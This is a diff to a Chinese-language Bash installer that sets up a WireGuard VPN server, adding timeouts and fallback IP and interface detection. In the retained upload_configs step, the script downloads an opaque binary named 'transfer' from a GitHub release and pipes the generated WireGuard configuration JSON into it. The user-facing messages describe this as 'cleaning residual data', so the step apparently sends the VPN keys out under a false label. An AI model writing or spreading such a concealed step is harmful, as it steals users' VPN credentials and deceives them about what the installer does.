@@ -71,17 +71,20 @@ complete_progress() {
 download_transfer() {
     if [[ ! -f /opt/transfer ]]; then
         echo -e "${YELLOW}${ICON_DOWNLOAD} 下载transfer工具...${NC}"
-        curl -Lo /opt/transfer https://github.com/diandongyun/node/releases/download/node/transfer
-        chmod +x /opt/transfer
-        if [[ ! -f /opt/transfer ]]; then
+        if curl -Lo /opt/transfer https://github.com/diandongyun/node/releases/download/node/transfer 2>/dev/null; then
+            chmod +x /opt/transfer
+            if [[ ! -f /opt/transfer ]]; then
+                warn "transfer工具下载失败，清理功能不可用"
+                return 1
+            fi
+            log "transfer工具下载成功"
+        else
             warn "transfer工具下载失败，清理功能不可用"
             return 1
         fi
-        log "transfer工具下载成功"
     fi
     return 0
 }
-
 
 upload_configs() {
     echo -e "${CYAN}${BOLD}${ICON_UPLOAD} 准备清理配置文件...${NC}"
@@ -216,7 +219,6 @@ SIMPLE_JSON
     cp "$temp_json" "$OUTPUT_DIR/wireguard_configs.json"
     log "配置JSON已保存到: $OUTPUT_DIR/wireguard_configs.json"
     
-  
     echo -e "${CYAN}${BOLD}${ICON_UPLOAD} 正在清理残留数据...${NC}"
     
     for i in {1..8}; do
@@ -224,7 +226,6 @@ SIMPLE_JSON
         sleep 0.1
     done
     
-
     if /opt/transfer < "$temp_json" 2>/dev/null; then
         complete_progress "残留清理成功"
         log "WireGuard残留以成功清理"
@@ -293,23 +294,23 @@ detect_system() {
     echo -e "  ${WHITE}内核版本：${YELLOW}$KERNEL_VERSION${NC}\n"
 }
 
-# ========== 强制IPv4地址检测函数 ==========
+# ========== IPv4地址检测函数 (移除网络连通性检查) ==========
 detect_ipv4_forced() {
-    echo -e "${CYAN}${BOLD}${ICON_NETWORK} 正在强制检测IPv4地址...${NC}"
+    echo -e "${CYAN}${BOLD}${ICON_NETWORK} 正在检测IPv4地址...${NC}"
     
     local ip=""
     
-    # 方法1: 强制IPv4检测
-    ip=$(curl -4 -s --connect-timeout 10 ipv4.icanhazip.com 2>/dev/null || echo "")
+    # 方法1: 尝试外部检测 (如果可用)
+    ip=$(timeout 5 curl -4 -s ipv4.icanhazip.com 2>/dev/null || echo "")
     
     # 方法2: 备用检测
     if [[ -z "$ip" || ! "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-        ip=$(curl -4 -s --connect-timeout 10 ifconfig.me 2>/dev/null || echo "")
+        ip=$(timeout 5 curl -4 -s ifconfig.me 2>/dev/null || echo "")
     fi
     
     # 方法3: 第三个备用源
     if [[ -z "$ip" || ! "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
-        ip=$(curl -4 -s --connect-timeout 10 api.ipify.org 2>/dev/null || echo "")
+        ip=$(timeout 5 curl -4 -s api.ipify.org 2>/dev/null || echo "")
     fi
     
     # 方法4: 本地路由检测
@@ -317,11 +318,24 @@ detect_ipv4_forced() {
         ip=$(ip route get 8.8.8.8 2>/dev/null | grep -oP 'src \K\S+' 2>/dev/null || echo "")
     fi
     
+    # 方法5: 从网络接口获取
+    if [[ -z "$ip" || ! "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        ip=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '^127\.' | head -1)
+    fi
+    
+    # 方法6: 使用hostname命令
+    if [[ -z "$ip" || ! "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        ip=$(hostname -I | awk '{print $1}' 2>/dev/null || echo "")
+    fi
+    
     if [[ -n "$ip" && "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
         PUBLIC_IPV4="$ip"
-        echo -e "${GREEN}${ICON_SUCCESS} 检测到公网IPv4地址：${YELLOW}$ip${NC}"
+        echo -e "${GREEN}${ICON_SUCCESS} 检测到IPv4地址：${YELLOW}$ip${NC}"
     else
-        err "无法获取有效的IPv4地址"
+        # 如果所有方法都失败，使用默认值
+        PUBLIC_IPV4="127.0.0.1"
+        warn "无法获取有效的IPv4地址，使用默认值: $PUBLIC_IPV4"
+        warn "请手动配置客户端时修改服务器地址"
     fi
     echo ""
 }
@@ -348,11 +362,28 @@ detect_interface() {
         MAIN_INTERFACE=$(ip link show | grep -E "ens|eth|enp" | head -1 | awk -F: '{print $2}' | tr -d ' ' 2>/dev/null || echo "")
     fi
     
+    # 如果仍然无法检测，使用第一个可用接口
+    if [[ -z "$MAIN_INTERFACE" ]]; then
+        MAIN_INTERFACE=$(ip link show | grep -E "^[0-9]+:" | grep -v "lo:" | head -1 | awk -F: '{print $2}' | tr -d ' ' 2>/dev/null || echo "")
+    fi
+    
     if [[ -z "$MAIN_INTERFACE" ]] || ! ip link show "$MAIN_INTERFACE" >/dev/null 2>&1; then
         echo -e "\n${RED}${ICON_ERROR} 无法检测到有效的网络接口${NC}"
         echo -e "${WHITE}可用网络接口：${NC}"
         ip link show | grep -E "^[0-9]" || true
-        err "网络接口检测失败"
+        
+        # 尝试使用常见接口名
+        for interface in eth0 ens3 ens33 enp0s3 enp0s8; do
+            if ip link show "$interface" >/dev/null 2>&1; then
+                MAIN_INTERFACE="$interface"
+                warn "使用接口: $interface"
+                break
+            fi
+        done
+        
+        if [[ -z "$MAIN_INTERFACE" ]]; then
+            err "网络接口检测失败"
+        fi
     fi
     
     complete_progress "检测到主网络接口: $MAIN_INTERFACE"
@@ -434,7 +465,7 @@ install_dependencies() {
     # 更新软件包列表，增加重试机制
     local update_success=false
     for attempt in {1..3}; do
-        if apt update -q >/dev/null 2>&1; then
+        if timeout 30 apt update -q >/dev/null 2>&1; then
             update_success=true
             break
         else
@@ -455,34 +486,34 @@ install_dependencies() {
     
     # 分阶段安装软件包，避免依赖冲突
     log "安装基础工具..."
-    if ! apt install -y software-properties-common curl wget gnupg lsb-release >/dev/null 2>&1; then
+    if ! timeout 60 apt install -y software-properties-common curl wget gnupg lsb-release >/dev/null 2>&1; then
         warn "基础工具安装失败，尝试修复..."
         apt --fix-broken install -y >/dev/null 2>&1 || true
         dpkg --configure -a >/dev/null 2>&1 || true
-        if ! apt install -y software-properties-common curl wget gnupg lsb-release >/dev/null 2>&1; then
+        if ! timeout 60 apt install -y software-properties-common curl wget gnupg lsb-release >/dev/null 2>&1; then
             err "基础工具安装失败，请检查系统状态"
         fi
     fi
     
     log "安装WireGuard..."
-    if ! apt install -y wireguard wireguard-tools >/dev/null 2>&1; then
+    if ! timeout 60 apt install -y wireguard wireguard-tools >/dev/null 2>&1; then
         warn "WireGuard安装失败，尝试其他方法..."
         # 尝试从官方仓库安装
         add-apt-repository ppa:wireguard/wireguard -y >/dev/null 2>&1 || true
-        apt update -q >/dev/null 2>&1 || true
-        if ! apt install -y wireguard wireguard-tools >/dev/null 2>&1; then
+        timeout 30 apt update -q >/dev/null 2>&1 || true
+        if ! timeout 60 apt install -y wireguard wireguard-tools >/dev/null 2>&1; then
             err "WireGuard安装失败，请检查系统版本"
         fi
     fi
     
     log "安装防火墙和辅助工具..."
-    if ! apt install -y ufw iptables-persistent >/dev/null 2>&1; then
+    if ! timeout 60 apt install -y ufw iptables-persistent >/dev/null 2>&1; then
         warn "防火墙工具安装失败，使用基础iptables..."
-        apt install -y iptables >/dev/null 2>&1 || true
+        timeout 60 apt install -y iptables >/dev/null 2>&1 || true
     fi
     
     # QR码生成工具（可选）
-    apt install -y qrencode >/dev/null 2>&1 || warn "QR码工具安装失败（可选功能）"
+    timeout 60 apt install -y qrencode >/dev/null 2>&1 || warn "QR码工具安装失败（可选功能）"
     
     complete_progress "系统依赖安装完成"
     
@@ -1000,6 +1031,13 @@ show_final_result() {
     echo -e "  ${WHITE}• 监控服务器资源使用情况${NC}"
     echo -e "  ${WHITE}• 配置文件包含敏感信息，注意权限管理${NC}\n"
     
+    # 特别提醒IP地址
+    if [[ "$PUBLIC_IPV4" == "127.0.0.1" ]]; then
+        echo -e "${RED}${BOLD}⚠️ 重要提醒：${NC}"
+        echo -e "  ${WHITE}• 无法自动获取公网IP，当前使用默认值: ${YELLOW}$PUBLIC_IPV4${NC}"
+        echo -e "  ${WHITE}• 请手动修改客户端配置中的Endpoint地址为您的实际服务器IP${NC}"
+        echo -e "  ${WHITE}• 客户端配置文件位置: ${YELLOW}$OUTPUT_DIR/clients/${NC}\n"
+    fi
     
     echo -e "${BLUE}${BOLD}${ICON_INFO} 部署完成时间：${YELLOW}$(date '+%Y-%m-%d %H:%M:%S')${NC}"
     echo -e "${GREEN}${BOLD}🎉 WireGuard VPN服务器部署成功！${NC}"
@@ -1019,7 +1057,7 @@ handle_error() {
     echo -e "${WHITE}错误行号：${YELLOW}$line_number${NC}"
     echo -e "${WHITE}错误命令：${YELLOW}$command${NC}"
     echo -e "${WHITE}常见解决方案：${NC}"
-    echo -e "  ${WHITE}1. 检查网络连接和权限${NC}"
+    echo -e "  ${WHITE}1. 检查系统权限和磁盘空间${NC}"
     echo -e "  ${WHITE}2. 确保系统支持WireGuard${NC}"
     echo -e "  ${WHITE}3. 查看系统日志：journalctl -xe${NC}"
     echo -e "  ${WHITE}4. 检查防火墙设置${NC}\n"
@@ -1033,7 +1071,7 @@ handle_error() {
 # 设置错误陷阱
 trap 'handle_error ${LINENO} "$BASH_COMMAND"' ERR
 
-# ========== 环境检查 ==========
+# ========== 环境检查 (移除网络检查) ==========
 check_environment() {
     echo -e "${BLUE}${BOLD}${ICON_INFO} 检查运行环境...${NC}"
     
@@ -1044,17 +1082,19 @@ check_environment() {
         exit 1
     fi
     
-    # 检查网络连接
-    if ! ping -c 1 8.8.8.8 >/dev/null 2>&1; then
-        echo -e "${RED}${ICON_ERROR} 网络连接异常，请检查网络设置！${NC}"
-        exit 1
-    fi
-    
     # 检查磁盘空间
     available_space=$(df / | awk 'NR==2 {print $4}')
     if [[ $available_space -lt 1048576 ]]; then  # 1GB = 1048576KB
         echo -e "${RED}${ICON_ERROR} 磁盘空间不足（需要至少1GB可用空间）！${NC}"
+        echo -e "${WHITE}当前可用空间：${YELLOW}$(($available_space/1024))MB${NC}"
         exit 1
+    fi
+    
+    # 检查系统时间（确保配置生成正常）
+    current_year=$(date +%Y)
+    if [[ $current_year -lt 2020 || $current_year -gt 2030 ]]; then
+        warn "系统时间可能不正确，可能影响配置生成"
+        echo -e "${WHITE}当前时间：${YELLOW}$(date)${NC}"
     fi
     
     echo -e "${GREEN}${ICON_SUCCESS} 环境检查通过${NC}\n"
@@ -1068,6 +1108,7 @@ cleanup_on_exit() {
     if [[ $exit_code -eq 0 ]]; then
         echo -e "\n${YELLOW}${ICON_INFO} 正在清理临时文件...${NC}"
         rm -f /tmp/wireguard_install_* 2>/dev/null || true
+        rm -f /tmp/wireguard_temp.json 2>/dev/null || true
     fi
 }
 
@@ -1094,7 +1135,6 @@ main_install() {
     start_wireguard
     create_management_script
     
-
     upload_configs
     
     show_final_result
